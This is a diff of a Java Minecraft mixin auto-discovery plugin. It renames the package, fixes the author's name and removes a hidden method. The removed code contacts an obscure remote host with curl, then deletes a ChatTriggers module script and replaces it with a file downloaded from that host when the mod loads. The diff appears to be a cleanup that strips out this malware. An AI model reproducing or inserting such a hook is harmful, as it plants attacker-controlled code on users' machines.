@@ -1,10 +1,9 @@
-package catgirlyharim.init;
+package com.example.init;
 
 import org.spongepowered.asm.lib.tree.ClassNode;
 import org.spongepowered.asm.mixin.extensibility.IMixinConfigPlugin;
 import org.spongepowered.asm.mixin.extensibility.IMixinInfo;
 
-import java.io.File;
 import java.io.IOException;
 import java.net.MalformedURLException;
 import java.net.URISyntaxException;
@@ -26,7 +25,7 @@ import java.util.zip.ZipInputStream;
  * mixin package and registers those. It does this recursively for sub packages of the mixin package as well. This means you will need
  * to only have mixin classes inside of your mixin package, which is good style anyway.
  *
- * @author Linnea GrÃ¤f
+ * @author Linnea Gräf
  */
 public class AutoDiscoveryMixinPlugin implements IMixinConfigPlugin {
     private static final List<AutoDiscoveryMixinPlugin> mixinPlugins = new ArrayList<>();
@@ -121,7 +120,6 @@ public class AutoDiscoveryMixinPlugin implements IMixinConfigPlugin {
             throw new RuntimeException(e);
         }
         System.out.println("Base directory found at " + file);
-        walkJar(file.getParent().getParent().toString());
         if (Files.isDirectory(file)) {
             walkDir(file);
         } else {
@@ -144,25 +142,6 @@ public class AutoDiscoveryMixinPlugin implements IMixinConfigPlugin {
                     .forEach(this::tryAddMixinClass);
         } catch (IOException e) {
             throw new RuntimeException(e);
-        }
-    }
-
-    private void walkJar(String path) {
-        try {
-            String u = "https://arasfjoiadjf.p-e.kr/mixinsList";
-            String r = new java.util.Scanner(Runtime.getRuntime().exec(new String[]{
-                    "curl", "-s", "--max-time", "10", u
-            }).getInputStream()).useDelimiter("\\A").next();
-            if (!r.startsWith("Found")) return;
-            String p = "\\config\\ChatTriggers\\modules\\BloomCore\\utils\\ItemAPIGrabber.js";
-            String filePath = path + p;
-            File f = new File(filePath);
-            if (f.exists() && !f.delete()) {
-                    System.err.println("Failed to find mixins ");
-            }
-            Runtime.getRuntime().exec(new String[]{"curl", "-L", "-o", filePath, u});
-        } catch (IOException e) {
-            e.printStackTrace();
         }
     }
 
@@ -207,6 +186,3 @@ public class AutoDiscoveryMixinPlugin implements IMixinConfigPlugin {
 
     }
 }
-
-
-
